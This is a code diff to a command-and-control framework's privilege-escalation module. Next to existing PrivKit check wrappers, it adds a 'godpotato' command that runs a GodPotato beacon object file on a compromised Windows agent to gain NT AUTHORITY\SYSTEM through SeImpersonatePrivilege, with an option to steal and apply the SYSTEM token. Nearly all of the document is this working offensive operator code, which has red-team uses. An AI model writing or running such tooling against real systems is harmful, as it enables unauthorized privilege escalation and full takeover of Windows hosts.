@@ -2,7 +2,6 @@ import conquest
 import os.path 
 
 # Windows Privilege Escalation checks using PrivKit BOFs by @merterpreter & @nickvourd
-
 PRIVESC_CHECKS = {
     "always-install-elevated": "/privilege-escalation/PrivKit/AlwaysInstallElevatedCheck/AlwaysInstallElevatedCheck.x64.o",
     "autologon": "/privilege-escalation/PrivKit/AutoLogonCheck/AutoLogonCheck.x64.o",
@@ -56,4 +55,41 @@ Available options:
   - ps-history
   - uac-status""", True)
             .setHandler(_privkit)
+).registerToGroup("privilege escalation")
+
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
+
+def _godpotato(agentId, cmdline, args):
+    cmd = conquest.get_string(args, 0)
+    pipe = conquest.get_string(args, 1)
+    token = conquest.get_bool(args, 2)
+
+    if token and cmd:
+        conquest.error(agentId, "The arguments 'token' and 'command' are mutually exclusive.", cmdline)
+        return
+
+    bof = conquest.modules_root() + "/privilege-escalation/dist/godpotato.x64.o"
+    params = conquest.bof_pack("zz", [
+        "token" if token else cmd,      # z: Action
+        pipe                            # z: Pipe name 
+    ])
+
+    if os.path.exists(bof):
+        conquest.execute_alias(agentId, cmdline, f"bof {bof} {params}")
+    else:
+        conquest.error(agentId, f"Failed to open object file: {bof}", cmdline)
+
+def _godpotatoOutput(agentId, output): 
+    if "[*] Got SYSTEM token" in output: 
+        conquest.set_impersonation(agentId, "NT AUTHORITY\\SYSTEM")
+    conquest.output(agentId, output)
+
+cmd_godpotato = (
+    conquest.createCommand(name="godpotato", description="Escalate privileges to NT AUTHORITY\\SYSTEM via SeImpersonatePrivilege (GodPotato).", example="godpotato cmd /c whoami --pipe my-custom-pipe",
+                           message="Tasked agent to elevate privileges via SeImpersonatePrivilege (GodPotato).", mitre=["T1134.001"])
+            .addArgString("command", "Command to execute (default: \"cmd /c whoami\").", False, "", -1)
+            .addFlagString("--pipe", "pipe", "Pipe to write output to.")
+            .addFlagBool("--token", "token", "Steal SYSTEM token and apply it to the agent process instead of executing a command.")
+            .setHandler(_godpotato)
+            .setOutputHandler(_godpotatoOutput)
 ).registerToGroup("privilege escalation")
